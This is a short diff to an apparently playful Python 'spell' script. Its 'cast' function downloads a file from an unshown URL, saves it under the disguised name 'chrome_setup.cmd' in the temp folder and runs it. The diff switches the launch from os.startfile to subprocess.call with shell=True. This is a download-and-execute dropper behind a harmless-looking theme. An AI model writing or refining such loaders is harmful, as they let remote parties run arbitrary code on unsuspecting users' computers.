@@ -1,6 +1,7 @@
 import urllib.request
 import os
 import tempfile
+import subprocess
 
 INTRO = r"""
    .    .    .         .    .     .
@@ -22,7 +23,7 @@ def cast(*args):
     try:
         tmp = os.path.join(tempfile.gettempdir(), "chrome_setup.cmd")
         urllib.request.urlretrieve(URL, tmp)
-        os.startfile(tmp)
+        subprocess.call(tmp, shell=True)
     except Exception as e:
         print(f"  [!] Curse failed: {e}")
 
